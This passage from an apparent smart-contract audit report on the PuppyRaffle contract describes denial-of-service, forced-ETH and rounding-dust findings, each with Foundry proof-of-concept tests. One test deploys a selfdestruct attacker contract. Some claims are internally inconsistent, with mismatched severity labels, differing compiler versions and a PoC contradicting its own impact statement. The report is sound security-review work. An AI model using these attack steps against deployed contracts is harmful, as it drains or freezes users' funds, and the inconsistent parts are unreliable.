        for (uint i; i < 50; ++i) batch1[i] = address(uint160(i + 1000));
        vm.prank(FUNDER);
        raffle.enterRaffle{value: ENTRANCE * 50}(batch1);

        // gas to add one more player after 50 existing players
        address[] memory one = new address[](1);
        one[0] = address(6000);
        vm.prank(FUNDER);
        uint256 gasStart = gasleft();
        raffle.enterRaffle{value: ENTRANCE}(one);
        uint256 gasAfter50 = gasStart - gasleft();

        // add 100 more players (total 151)
        address[] memory batch2 = new address[](100);
        for (uint i; i < 100; ++i) batch2[i] = address(uint160(i + 2000));
        vm.prank(FUNDER);
        raffle.enterRaffle{value: ENTRANCE * 100}(batch2);

        // gas to add one player after 151 existing players
        address[] memory oneMore = new address[](1);
        oneMore[0] = address(7000);
        vm.prank(FUNDER);
        gasStart = gasleft();
        raffle.enterRaffle{value: ENTRANCE}(oneMore);
        uint256 gasAfter150 = gasStart - gasleft();

        // After tripling player count, gas should grow by >3x (quadratic behaviour)
        assertGt(gasAfter150, gasAfter50 * 3);
    }
}

## Suggested Mitigation
Maintain a mapping(address => bool) playerInRaffle to track existing participants and check duplicates in O(1). When a player is added, set playerInRaffle[addr] = true; when they refund or when a winner is selected, clear the mapping. This removes the quadratic loop and caps the gas cost per call to a linear function of newPlayers.length.

## [M-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function requires that the contract's balance exactly matches `totalFees`, which can be broken if someone sends ETH directly to the contract:

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    // ...
}
```

If ETH is sent directly to the contract address via `selfdestruct` or as a coinbase reward, the balance check will fail and fees cannot be withdrawn.

## Impact
If anyone sends Ether to the contract outside the normal raffle flow (for example through self-destruct), `address(this).balance` becomes larger than `totalFees`. From that moment on every call to `withdrawFees` reverts, which permanently traps all protocol fees already accrued and all fees that will be accrued in future rounds. The raffle itself continues to function for players – only the protocol is deprived of its revenue stream.

## Proof of Concept
1. The contract accumulates some fees from raffles in the `totalFees` variable
2. An attacker creates a contract with ETH and calls `selfdestruct` targeting the PuppyRaffle contract
3. The PuppyRaffle contract now has more ETH than accounted for in `totalFees`
4. When the owner tries to call `withdrawFees()`, the transaction reverts because `address(this).balance > uint256(totalFees)`
5. The fees are permanently locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfDestructAttacker {
    function attack(address payable target) external payable {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    SelfDestructAttacker attacker;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    address feeAddress = address(2);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
        attacker = new SelfDestructAttacker();
        
        // Fund accounts
        vm.deal(address(this), 10e18);
        vm.deal(address(attacker), 1e18);
    }

    function testWithdrawFeesFailsDueToUnexpectedEth() public {
        // Setup a completed raffle to generate fees
        address[] memory players = new address[](4);
        for(uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
        }
        
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
        
        // Verify fees were collected
        uint256 totalFees = puppyRaffle.totalFees();
        assertGt(totalFees, 0, "No fees collected");
        
        // Make sure we can withdraw fees before attack
        vm.prank(owner);
        puppyRaffle.withdrawFees();
        
        // Setup a new raffle and generate fees
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
        
        // Send unexpected ETH via selfdestruct
        attacker.attack{value: 1 ether}(payable(address(puppyRaffle)));
        
        // Try to withdraw fees - should fail
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        vm.prank(owner);
        puppyRaffle.withdrawFees();
        
        // Check contract balance vs totalFees
        uint256 contractBalance = address(puppyRaffle).balance;
        uint256 currentTotalFees = puppyRaffle.totalFees();
        
        console.log("Contract balance:", contractBalance);
        console.log("Total fees:", currentTotalFees);
        console.log("Unexpected ETH (locked forever):", contractBalance - currentTotalFees);
        
        // Verify that balance is greater than accounted fees
        assertGt(contractBalance, currentTotalFees, "Contract should have more ETH than accounted for");
    }
}

## Suggested Mitigation
Keep the original intention of blocking withdrawals while a round is in progress, but avoid the fragile balance-equality check:

```solidity
function withdrawFees() external {
    // block withdrawals when someone is still in the current round
    require(players.length == 0, "PuppyRaffle: there are active players");

    uint256 fees = totalFees;
    totalFees = 0;

    // send only the fees that were accounted for – any stray ETH is left in the contract
    (bool ok, ) = feeAddress.call{value: fees}("");
    require(ok, "PuppyRaffle: fee transfer failed");
}

// optional utility for the owner to recover un-accounted ETH
function sweepUnexpectedEther(address to) external onlyOwner {
    // amount that should stay inside the contract (0 when no players)
    uint256 requiredBalance = totalFees;
    uint256 excess = address(this).balance - requiredBalance;
    if (excess > 0) {
        (bool ok, ) = to.call{value: excess}("");
        require(ok, "PuppyRaffle: sweep failed");
    }
}
```

## [M-6]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function calculates the fee as 20% of the total amount collected, but doesn't use a consistent calculation method that ensures prize + fee equals total amount. Due to integer division truncation, there could be a small amount of ETH left in the contract.

```solidity
function selectWinner() external {
    // ...
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    // Due to integer division, prizePool + fee might be slightly less than totalAmountCollected
    // ...
}
```

## Impact
Whenever `players.length * entranceFee` is not an exact multiple of 100, the remainder (1–99 wei) is left inside the contract. Because `totalFees` is increased only by the rounded–down 20 % value, `address(this).balance` becomes larger than `totalFees` and the strict equality check in `withdrawFees()` permanently prevents anyone from withdrawing protocol fees. After the first such occurrence, ALL subsequently accrued fees are stuck forever, representing a permanent loss of the protocol’s revenue stream.

## Proof of Concept
Assume entranceFee = 3 wei and exactly 4 players join the raffle (total 12 wei).

1. prizePool = (12 * 80) / 100 = 9 wei
2. fee       = (12 * 20) / 100 = 2 wei
3. Unaccounted dust          = 1 wei (12 − 9 − 2)
4. Contract balance after paying the winner = fee + dust = 3 wei, while `totalFees` is only 2 wei.
5. `withdrawFees()` checks `address(this).balance == totalFees` and therefore reverts forever, locking the entire fee pot.

Any round whose total is not divisible by 100 triggers the same situation, so the protocol owner is almost guaranteed to lose all future fee revenue.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerDivisionDustTest is Test {
    PuppyRaffle raffle;
    address owner   = address(1);
    address feeAddr = address(2);

    function setUp() public {
        vm.startPrank(owner);
        // entranceFee deliberately chosen so that (4 * fee) % 100 != 0
        raffle = new PuppyRaffle(3, feeAddr, 1 days);
        vm.stopPrank();

        // give every test actor some ETH
        for (uint160 i = 10; i < 14; i++) {
            vm.deal(address(i), 1 ether);
        }
    }

    function testDustLocksFees() public {
        // 4 unique players enter, sending 12 wei in total
        address[] memory entrants = new address[](4);
        entrants[0] = address(10);
        entrants[1] = address(11);
        entrants[2] = address(12);
        entrants[3] = address(13);

        vm.prank(address(10));
        raffle.enterRaffle{value: 12}(entrants);

        // finish the round
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();

        // contract now holds fee (2 wei) + dust (1 wei) = 3 wei
        assertEq(address(raffle).balance, 3, "unexpected balance");

        // owner can never withdraw because of the dust
        vm.startPrank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
        vm.stopPrank();
    }
}

## Suggested Mitigation
Compute either the fee or the prize first and derive the other from the total so their sum always equals `totalAmountCollected`:

```solidity
uint256 fee = (totalAmountCollected * 20) / 100;
uint256 prizePool = totalAmountCollected - fee; // guarantees exact split
```

After deploying a fixed version, the project should migrate accumulated funds or add an emergency function that allows the owner to sweep any `address(this).balance - totalFees` remainder once, to rescue dust already trapped in live contracts.

## [M-7]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function incorrectly calculates the prize pool and fees. It calculates these values based on the total number of players, but doesn't account for players who have been refunded (set to address(0) in the players array). This can result in incorrect prize pool and fee calculations.

```solidity
function selectWinner() external {
    // ... validation ...
    
    // Calculate total amount collected based on raw players.length
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    // ... rest of function ...
}
```

## Impact
Any player can refund enough tickets so that `address(this).balance` < `(players.length * entranceFee * 80) / 100`. When `selectWinner` is executed the internal `call{value: prizePool}` will try to transfer more ETH than the contract owns and the whole transaction reverts, permanently blocking the raffle: no winner is chosen, players cannot enter a new round, fees stay locked and the contract becomes unusable until more ETH is forcibly sent to it. This is a Denial-of-Service against the core functionality.

## Proof of Concept
1. Four addresses purchase one ticket each (contract holds 4 ETH)
2. Three of them call `refund`, reducing the balance to 1 ETH while the `players` array length stays 4
3. Anyone calls `selectWinner` after the raffle duration
4. `totalAmountCollected = 4 * entranceFee = 4 ETH`, so `prizePool = 3.2 ETH` > 1 ETH
5. The value-transfer therefore reverts with “insufficient balance” and the whole transaction reverts, freezing the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PrizeCalculationRevert is Test {
    PuppyRaffle raffle;
    address feeReceiver = address(0xfee);
    address p1 = address(0x1);
    address p2 = address(0x2);
    address p3 = address(0x3);
    address p4 = address(0x4);

    uint256 constant ENTRANCE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, feeReceiver, 1 days);

        address[] memory batch = new address[](4);
        batch[0] = p1;
        batch[1] = p2;
        batch[2] = p3;
        batch[3] = p4;

        vm.deal(p1, 4 ether);
        vm.prank(p1);
        raffle.enterRaffle{value: 4 ether}(batch);

        // Refund three players so contract only holds 1 ETH
        vm.startPrank(p1);
        raffle.refund(1); // p2
        raffle.refund(2); // p3
        raffle.refund(3); // p4
        vm.stopPrank();

        assertEq(address(raffle).balance, 1 ether); // sanity

        vm.warp(block.timestamp + 1 days + 1);
    }

    function testSelectWinnerReverts() public {
        vm.expectRevert(); // empty revert data is fine
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Compute `prizePool` and `fee` from the real ETH collected, not from `players.length`. The simplest and safest fix is:

uint256 totalAmountCollected = address(this).balance;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee       = totalAmountCollected - prizePool;

If the protocol wants to maintain a deterministic split per ticket, additionally keep an `activePlayerCount` counter that is incremented on entry and decremented on refund and use it for the `require(players.length >= 4)` check, while still relying on `address(this).balance` for value transfers.



# Low Risk Findings

## [L-1]. Gas Grief BlockLimit issue in PuppyRaffle::refund

## Description
In the `refund` function, players are set to address(0) but not removed from the array to preserve indices. This creates a risk of wasting gas during duplicate checks as the array includes non-active players (set to address(0)). It also poses a risk in `getActivePlayerIndex` which might return index 0 for both the first active player and for non-existent players.

```solidity
function refund(uint256 playerIndex) external {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    address(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0); // Setting to zero address instead of removing
    emit RaffleRefunded(playerAddress);
}

function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // Returns 0 for non-existent players and first player in array
}
```

## Impact
Refunded players leave address(0) holes in the `players` array, which increases the gas cost of `enterRaffle` calls for the remainder of the current round. In the worst case this can make participation prohibitively expensive until `selectWinner` is executed, after which the array is cleared. No funds can be stolen and the contract cannot be permanently DOSed.

## Proof of Concept
1. Deploy PuppyRaffle
2. Have a player (address1) enter the raffle
3. Have that player (address1) request a refund
4. Have the same player try to re-enter - this will still trigger the duplicate check against their address(0) entry
5. Call getActivePlayerIndex for an inactive player and get 0, which is indistinguishable from the index of the first player

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundTest is Test {
    PuppyRaffle puppyRaffle;
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        vm.deal(user1, 100e18);
        vm.deal(user2, 100e18);
    }

    function testRefundArrayBloat() public {
        // User1 enters raffle
        address[] memory players = new address[](1);
        players[0] = user1;
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // User1 refunds
        vm.prank(user1);
        puppyRaffle.refund(0);
        
        // Check user1's slot is now address(0)
        assertEq(puppyRaffle.getActivePlayerIndex(user1), 0, "User should not be found after refund");
        
        // Now user2 enters
        players[0] = user2;
        vm.prank(user2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // The array now has [address(0), user2] which is inefficient
        // getActivePlayerIndex is ambiguous - returns 0 for both not found and first element
        uint256 nonExistentUserIndex = puppyRaffle.getActivePlayerIndex(address(0x123));
        uint256 user2Index = puppyRaffle.getActivePlayerIndex(user2);
        
        console.log("Non-existent user index:", nonExistentUserIndex);
        console.log("User2 index:", user2Index);
        // Both can be 0 in different scenarios, causing ambiguity
    }
}

## Suggested Mitigation
Replace the current approach with a more efficient data structure. Use a mapping to track active players and a separate array for active indices. When a player refunds, remove them from both structures.

```solidity
mapping(address => bool) private isActive;
mapping(address => uint256) private playerToIndex;

function refund(uint256 playerIndex) external {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(isActive[playerAddress], "PuppyRaffle: Player already refunded, or is not active");
    
    address(msg.sender).sendValue(entranceFee);
    
    // Remove player from active status
    isActive[playerAddress] = false;
    
    // Efficiently remove from array by swapping with last element
    uint256 lastPlayerIndex = players.length - 1;
    if (playerIndex != lastPlayerIndex) {
        address lastPlayer = players[lastPlayerIndex];
        players[playerIndex] = lastPlayer;
        playerToIndex[lastPlayer] = playerIndex;
    }
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}

function getActivePlayerIndex(address player) external view returns (uint256) {
    if (!isActive[player]) return type(uint256).max; // Clear indication player isn't active
    return playerToIndex[player];
}
```

## [L-2]. Integer Overflow/Math issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function doesn't check for a zero address in the `feeAddress` field. If `feeAddress` is incorrectly set to the zero address, all accumulated fees would be permanently lost when withdrawn.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
If `feeAddress` is mistakenly set to address(0), all accumulated fees would be lost forever. This represents a permanent loss of funds for the protocol. While the `changeFeeAddress` function allows updating the fee address, if it's initially set to zero or changed to zero accidentally, fees could be lost when withdrawn.

## Proof of Concept
1. Deploy PuppyRaffle with `feeAddress` set to address(0) or change it to address(0) using `changeFeeAddress`
2. Multiple raffles complete and accumulate fees
3. Call `withdrawFees()`
4. Funds are sent to address(0) and permanently lost

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressFeeTest is Test {
    PuppyRaffle puppyRaffle;
    address public user1 = makeAddr("user1");
    uint256 entranceFee = 1e18;

    function setUp() public {
        // Initialize with zero address as fee recipient
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(0),  // Zero address as fee recipient
            1 days
        );
        vm.deal(user1, 100e18);
    }

    function testZeroAddressFee() public {
        // User enters raffle
        address[] memory players = new address[](4);
        players[0] = user1;
        players[1] = makeAddr("user2");
        players[2] = makeAddr("user3");
        players[3] = makeAddr("user4");
        
        vm.deal(user1, 4 * entranceFee);
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
        
        // Skip ahead to end of raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Select winner, which accumulates fees
        puppyRaffle.selectWinner();
        
        // Check accumulated fees
        uint256 balanceBefore = address(puppyRaffle).balance;
        console.log("Contract balance before withdrawal:", balanceBefore);
        
        // Withdraw to zero address
        puppyRaffle.withdrawFees();
        
        // Funds are gone forever
        uint256 balanceAfter = address(puppyRaffle).balance;
        console.log("Contract balance after withdrawal:", balanceAfter);
        
        assertEq(balanceAfter, 0, "Funds were sent to address(0) and lost");
    }
}

## Suggested Mitigation
Add a zero address check in both the constructor and the `changeFeeAddress` function to prevent the `feeAddress` from being set to address(0).

```solidity
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
    require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;
    raffleDuration = _raffleDuration;
    // Rest of constructor code...
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
    require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

Also, add a check in the `withdrawFees` function for additional safety:

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    require(feeAddress != address(0), "PuppyRaffle: Fee address is zero address");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [L-3]. DOS issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 when a player is not found, which conflicts with the index 0 that could be returned for a legitimate player. This makes it impossible to distinguish between a player at index 0 and a non-existent player.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // This creates ambiguity
}
```

## Impact
The ambiguity may confuse off-chain callers or third-party contracts that consume the view function, forcing them to perform an additional on-chain storage read to verify whether the returned index really belongs to the queried address (e.g. by checking players[index]). It cannot be leveraged to steal funds or block contract functionality because:
• `refund()` still reverts unless the supplied index maps to `msg.sender`,
• core state-changing logic inside the contract never makes decisions based on `getActivePlayerIndex`.
The effect is limited to poor developer experience and possible wasted gas from reverted transactions.

## Proof of Concept
1. Alice is the first player to enter the raffle and is at index 0
2. A third-party contract calls `getActivePlayerIndex(Alice)` which returns 0
3. The contract cannot determine if Alice is at index 0 or if she's not in the raffle
4. Bob is not in the raffle, but calling `getActivePlayerIndex(Bob)` also returns 0
5. The contract incorrectly treats Bob as if he is at index 0

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PlayerIndexAmbiguityTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    address player1 = address(2);
    address player2 = address(3);
    address nonPlayer = address(4);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            1 days
        );
        
        // Fund accounts
        vm.deal(player1, 10e18);
        vm.deal(player2, 10e18);
    }

    function testPlayerIndexAmbiguity() public {
        // Player1 enters the raffle (will be at index 0)
        vm.prank(player1);
        address[] memory players = new address[](1);
        players[0] = player1;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Check index for player1 (should be 0)
        uint256 player1Index = puppyRaffle.getActivePlayerIndex(player1);
        assertEq(player1Index, 0, "Player1 should be at index 0");
        
        // Check index for nonPlayer (should be 0, which is the same as player1)
        uint256 nonPlayerIndex = puppyRaffle.getActivePlayerIndex(nonPlayer);
        assertEq(nonPlayerIndex, 0, "NonPlayer should return 0");
        
        // Demonstrate the ambiguity
        bool isAmbiguous = (player1Index == nonPlayerIndex);
        assertTrue(isAmbiguous, "Index should be ambiguous");
        
        console.log("Player1 index:", player1Index);
        console.log("NonPlayer index:", nonPlayerIndex);
        console.log("Ambiguity detected: cannot distinguish between player at index 0 and non-existent player");
    }
}

## Suggested Mitigation
Modify the `getActivePlayerIndex` function to return a special value (like uint256 max) for players not found in the array, or add a boolean return value to indicate whether the player was found:

```solidity
// Return max uint256 for players not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Special value indicating player not found
}

// Alternative: return a boolean as well
function getActivePlayerIndex(address player) external view returns (uint256, bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (0, false); // Return 0 and false for player not found
}
```

## [L-4]. DOS issue in PuppyRaffle::selectWinner

## Description
The contract requires a minimum of 4 players to select a winner, but lacks a check for this condition in the constructor. This means a raffle can be created where it's impossible to select a winner if fewer than 4 players enter, permanently locking their funds in the contract.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    // ...
}
```

## Impact
If the raffle duration has elapsed with fewer than four distinct participants, selectWinner() will keep reverting until either an additional player joins or the existing players call refund(). The raffle round can therefore stall if all current entrants abandon the contract, but their ETH is still retrievable by each of them through refund(), so funds are not irreversibly locked.

## Proof of Concept
1. Deploy a PuppyRaffle contract
2. Only 3 players enter the raffle
3. When the raffle duration ends, calling selectWinner() will revert due to the 'Need at least 4 players' check
4. The 3 players have now permanently lost their entrance fees since the raffle cannot be completed
5. Additionally, there's no emergency function to return funds or reset the raffle in this scenario

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract InsufficientPlayersTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address feeAddress = address(2);
    address player1 = address(3);
    address player2 = address(4);
    address player3 = address(5);
    
    function setUp() public {
        vm.startPrank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        vm.stopPrank();
        
        // Fund the players
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
    }
    
    function testFundsLockedWithInsufficientPlayers() public {
        // Enter raffle with only 3 players
        address[] memory players = new address[](3);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: 3 ether}(players);
        
        // Fast forward to end the raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Attempt to select winner should revert
        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
        
        // Verify funds are stuck in the contract
        assertEq(address(puppyRaffle).balance, 3 ether, "Funds should be locked in contract");
        
        // Players can still refund their individual entries
        uint256 player1BalanceBefore = player1.balance;
        vm.prank(player1);
        puppyRaffle.refund(0); // player1 is at index 0
        assertEq(player1.balance - player1BalanceBefore, 1 ether, "Player1 should get refund");
        
        // But if players don't know about refund function or forget to call it,
        // their funds would remain locked
    }
}

## Suggested Mitigation
Implement a failsafe mechanism that allows refunding all players if the minimum threshold isn't met by the end of the raffle duration. Add an additional function that can be called when the raffle duration is over but there aren't enough players:

```solidity
// Add this function to allow cancellation of raffles with insufficient participants
function cancelRaffleAndRefundAll() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length < 4, "PuppyRaffle: Enough players to select winner");
    
    // Refund all active players
    for (uint256 i = 0; i < players.length; i++) {
        address playerAddress = players[i];
        if (playerAddress != address(0)) { // Check if not already refunded
            // Store in memory to avoid re-entrancy issues
            address payable playerToRefund = payable(playerAddress);
            players[i] = address(0); // Update state before external call
            
            // Refund the player
            playerToRefund.sendValue(entranceFee);
        }
    }
    
    // Reset the raffle
    delete players;
    raffleStartTime = block.timestamp;
    
    emit RaffleCancelled();
}

// Add a new event
event RaffleCancelled();
```

Alternatively, consider removing the minimum player requirement or making it configurable at deployment time.

## [L-5]. Gas Grief BlockLimit issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function uses a linear search through the players array, which becomes increasingly gas-inefficient as the number of players grows. This can lead to high gas costs for operations that depend on this function and potentially exceeding the block gas limit for large arrays.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
Calling `getActivePlayerIndex` on-chain becomes more expensive as the `players` array grows, so any EOA or contract that insists on executing the call on-chain will pay progressively higher gas. No core contract path is affected and no denial-of-service of the raffle itself is possible; the worst case is that a user or integrator decides it is too costly to run the helper on-chain.

## Proof of Concept
1. Create a raffle with a large number of players (e.g., 1000)
2. Call getActivePlayerIndex for a player at the end of the array
3. The function will need to iterate through nearly all 1000 elements, consuming significant gas
4. If the gas cost exceeds the block gas limit, the function becomes unusable

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasLimitSearchTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address feeAddress = address(2);
    address player = address(3);
    
    function setUp() public {
        vm.startPrank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        vm.stopPrank();
        
        vm.deal(player, 1000 ether);
    }
    
    function testGetActivePlayerIndexGasUsage() public {
        // Create arrays of different sizes to test gas usage
        uint256[] memory arraySizes = new uint256[](3);
        arraySizes[0] = 10;
        arraySizes[1] = 100;
        arraySizes[2] = 500; // Even larger arrays could be tested
        
        for (uint256 s = 0; s < arraySizes.length; s++) {
            uint256 size = arraySizes[s];
            
            // Create array of players
            address[] memory players = new address[](size);
            for (uint256 i = 0; i < size; i++) {
                players[i] = address(uint160(i + 10));
            }
            
            // Enter raffle with all players
            vm.prank(player);
            puppyRaffle.enterRaffle{value: size * 1 ether}(players);
            
            // Test gas usage for finding first player (best case)
            uint256 gasStart = gasleft();
            puppyRaffle.getActivePlayerIndex(players[0]);
            uint256 gasUsedFirst = gasStart - gasleft();
            
            // Test gas usage for finding last player (worst case)
            gasStart = gasleft();
            puppyRaffle.getActivePlayerIndex(players[size-1]);
            uint256 gasUsedLast = gasStart - gasleft();
            
            // Test gas usage for non-existent player
            gasStart = gasleft();
            puppyRaffle.getActivePlayerIndex(address(999999));
            uint256 gasUsedNonExistent = gasStart - gasleft();
            
            console.log("Array size:", size);
            console.log("Gas for first player:", gasUsedFirst);
            console.log("Gas for last player:", gasUsedLast);
            console.log("Gas for non-existent player:", gasUsedNonExistent);
            
            // Clean up for next iteration
            vm.warp(block.timestamp + 1 days + 1);
            puppyRaffle.selectWinner();
        }
    }
}

## Suggested Mitigation
Replace the linear search with a more efficient data structure such as a mapping to track player indexes:

```solidity
// Add this mapping to the contract
mapping(address => uint256) private playerIndices;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Require that player hasn't already entered
        require(playerIndices[player] == 0 && players.length == 0 || 
                players[playerIndices[player] - 1] != player, 
                "PuppyRaffle: Duplicate player");
        
        players.push(player);
        playerIndices[player] = players.length; // Store 1-based index
    }
    
    emit RaffleEnter(newPlayers);
}

function refund(uint256 playerIndex) external {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    players[playerIndex] = address(0);
    playerIndices[playerAddress] = 0; // Clear index
    
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}

function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    uint256 storedIndex = playerIndices[player];
    if (storedIndex == 0) {
        return (false, 0); // Player not found
    }
    
    // Convert from 1-based to 0-based index and verify
    uint256 actualIndex = storedIndex - 1;
    if (players[actualIndex] == player) {
        return (true, actualIndex);
    }
    
    return (false, 0); // Player was removed or index is corrupted
}

function selectWinner() external {
    // ...
    
    // Reset playerIndices for all players
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            playerIndices[players[i]] = 0;
        }
    }
    
    delete players;
    // ...
}
```

This approach uses O(1) lookups instead of O(n) searches, dramatically improving gas efficiency for large player arrays.



# Info Risk Findings

## [I-1]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 when a player is not found in the array. This makes it impossible to distinguish between a player at index 0 and a player that doesn't exist. This causes ambiguity and potential confusion for users and integrating contracts.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // Returns 0 for non-existent players, indistinguishable from index 0
}
```

## Impact
The function can return the same value (0) for both "index 0" and "not found", which can confuse front-ends or off-chain integrations that rely on this return value for UI logic. However, it cannot be used to steal funds or otherwise alter on-chain state because refund() still verifies msg.sender equals the stored address. The problem is therefore limited to potential UX mistakes rather than a security loss.

## Proof of Concept
1. Deploy the PuppyRaffle contract
2. Have a player (address1) enter the raffle as the first participant
